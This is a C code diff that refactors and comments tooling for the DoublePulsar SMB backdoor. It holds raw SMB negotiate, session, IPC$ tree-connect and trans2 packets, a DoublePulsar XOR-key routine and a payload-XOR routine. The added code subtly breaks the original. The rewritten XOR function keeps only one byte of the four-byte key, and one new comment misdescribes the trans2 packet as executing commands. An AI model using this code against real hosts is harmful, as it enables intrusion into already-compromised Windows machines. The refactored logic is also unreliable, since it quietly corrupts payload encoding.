@@ -1,10 +1,11 @@
-//To determine if DoublePulsar is present
+// SMB negotiation packet is sent to initiate the SMB protocol handshake with the target system.
 unsigned char SmbNegociate[] =
 "\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 "\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54"
 "\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";
 
+//Session setup AndX request packet is sent to establish a session with the target system.
 unsigned char Session_Setup_AndX_Request[] =
 "\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00"
 "\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
@@ -13,6 +14,7 @@ unsigned char Session_Setup_AndX_Request[] =
 "\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
 "\x62\x00";
 
+//Tree connect request packet is sent to connect to a share on the target system.
 unsigned char treeConnectRequest[] =
 "\x00\x00\x00\x58\xff\x53\x4d\x42\x75\x00"
 "\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
@@ -22,14 +24,17 @@ unsigned char treeConnectRequest[] =
 "\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f\x3f"
 "\x3f\x00";
 
+//trans2 session setup packet is sent to execute commands on the target system after a session has been established.
 unsigned char trans2_session_setup[] =
 "\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
 "\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
 "\x00\xA6\xD9\xA4\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01"
 "\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-"\x00\x00"
+"\x00\x00";
 
+
+// Convert Little Endian 4-byte array to unsigned int
 unsigned int LE2INT(unsigned char* data) {
     unsigned int b;
     b = data[3];
@@ -42,22 +47,20 @@ unsigned int LE2INT(unsigned char* data) {
     return b;
 }
 
-unsigned int ComputerDOUBLEPULSARXorKey(unsigned int key) {
+// Calculate DoublePulsar XOR Key
+unsigned int computerDoublePulsarXorKey(unsigned int key) {
     return 2 * key ^ ((((key >> 16) | key & 0xFF0000) >> 8) | (((key << 16) | key & 0xFF00) << 8));
 }
 
-int xor_payload(int xor_key, int buf, int size) {
-    int i;
-    char __xor_key[5];
-    i = 0;
-    *&__xor_key[1] = 0;
-    *__xor_key = xor_key;
-    if (size <= 0)
-        return 0;
-    do {
-        *(i + buf) ^= __xor_key[i % 4];
+// XOR payload with DoublePulsar XOR Key
+int xorPayload(int xorKey, int buffer, int size) {
+    if (size <= 0) return 0;
+    char xorKeyArray[] = { xorKey, 0, 0, 0, 0 };
+
+    for (int i = 0; i < size; ) {
+        *(i + buffer) ^= xorKeyArray[i % 4];
         ++i;
-    } while (i < size);
+    }
     return 0;
 }
 
